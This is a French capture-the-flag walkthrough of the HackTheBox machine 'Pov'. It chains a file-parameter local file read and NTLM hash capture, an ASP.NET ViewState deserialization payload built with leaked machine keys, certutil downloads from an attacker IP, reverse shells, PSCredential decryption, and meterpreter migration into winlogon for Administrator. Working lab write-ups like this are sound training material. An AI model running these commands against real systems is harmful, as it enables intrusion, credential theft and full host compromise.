  # Pov

	echo "10.10.11.251 pov.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.251 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.251 -oN nmap.txt
	feroxbuster --silent -u http://pov.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 10.0


Fuzzing supplémentaire : 

	ffuf -H "Host: FUZZ.pov.htb" -u http://pov.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 12330

Un sous-domaine existe : 

> dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 71ms]

    echo "10.10.11.251 dev.pov.htb" >> /etc/hosts
	feroxbuster --silent -u http://dev.pov.htb/

Sur http://dev.pov.htb/portfolio/ on a la possibilité de télécharger le CV du développeur. Mais en interceptant la requête sur Burp on peut voir que le nom du fichier est passé en paramètre : 


>__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=xLdlIrD4zOZX5xklCTVgiHXWkii0xrpXlMRmLuTDqhDOGgp6exCmaAzYMOOyLFqYfXC%2B5Li0KHKuMYGOzOvGkT5HpSA%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=YaOP0Rof23cmW%2BabVxZcb3HOa5kDX9HbBa2r1YQ%2BCSZpeOWsprHs3DtMAyMSOSSyXKU1clpcntmCzY8j1tlXQvnrygd7PWuqGoUksR3gpgoum7%2BVKRzu6kvP3%2BARKDs4eQ1Iiw%3D%3D&file=cv.pdf

En mettant un Responder à la place du fichier, j'ai réussi à obtenir un retour : 

    sudo responder -I tun0

>[SMB] NTLMv2-SSP Client   : 10.10.11.251
><br>[SMB] NTLMv2-SSP Username : POV\sfitz
><br>[SMB] NTLMv2-SSP Hash     : sfitz::POV:ef...
    

Impossible de casser le hash mais on semble aussi pouvoir lire des fichiers locaux. En remplaçant le dernier paramètre par "&file=C:\WINDOWS\System32\drivers\etc\hosts" on a bien le contenu du fichier.


Je n'ai pas trouvé de voie directe vers le foothold avec ces éléments, mais d'autres possibilités semblent exister pour ce cas de figure spécifique, notamment avec Ysoserial. 

Voir : https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter


    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c “powershell -e [BASE64]” --path=“/portfolio/default.aspx” --apppath=“/” --decryptionalg=“AES” --decryptionkey=“74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43” --validationalg=“SHA1” --validationkey=“5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468”
    
Les dernières clés s'obtiennent en lisant le fichier web.config : 

    [...]&file=/web.config

En lançant un listener puis en relançant la requête dans Burp avec le bon __VIEWSTATE on obtient bien une connexion en tant que **sfitz**


## Pivoting

On trouve un fichier intéressant dans les documents de sfitz : 

    type C:\Users\sfitz\Documents\connection.xml
    
    <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
      <Obj RefId="0">
        <TN RefId="0">
          <T>System.Management.Automation.PSCredential</T>
          <T>System.Object</T>
        </TN>
        <ToString>System.Management.Automation.PSCredential</ToString>
        <Props>
          <S N="UserName">alaading</S>
          <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
        </Props>
      </Obj>
    </Objs>


On peut déchiffrer ce mot de passe avec Powershell : 

    $EncryptedString = Get-Content .\password.txt
    $SecureString = ConvertTo-SecureString $EncryptedString
    $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
    echo $Credential.GetNetworkCredential().password


On peut maintenant exécuter des commandes en tant que cet utilisateur : 

    certutil -urlcache -split -f  "http://10.10.16.21:8000/RunasCs.exe"
    .\RunasCs.exe alaading [PASSWORD] cmd.exe -r 10.10.16.21:9998
    ...
    rlwrap nc -nvlp 9998
    powershell -ep bypass
    type C:\Users\alaading\Desktop\user.txt


## Élévation de privilèges


    whoami /priv 
    
On voit que le SeDebugPrivilege est présent sur cet utilisateur. Des élévations de privilèges existent pour ce cas de figure.

Voir : 
- https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens

En revanche, le privilège est présent mais désactivé, il existe toutefois des outils permettant de les réactiver : https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1

    certutil -urlcache -split -f "http://10.10.16.21:8000/EnableAllTokenPrivs.ps1"
    .\EnableAllTokenPrivs.ps1

J'ai ensuite obtenu les privilèges d'administrateur juste avec le Meterpreter, en migrant dans Winlogon qui est un processus privilégié :


Côté cible : 

    certutil -urlcache -split -f "http://10.10.16.21:8000/msfvenom.exe"
    
Côté attaquant : 

    msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=9997 LHOST=10.10.16.21 -f exe -o msfvenom.exe 
    ...
    msfconsole 
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set LPORT 9997
    msf6 exploit(multi/handler) > set LHOST 10.10.16.21
    msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > run
    ...
    whoami
    ps 
    migrate 548
    shell
    whoami
    type C:\Users\Administrator\Desktop\root.txt
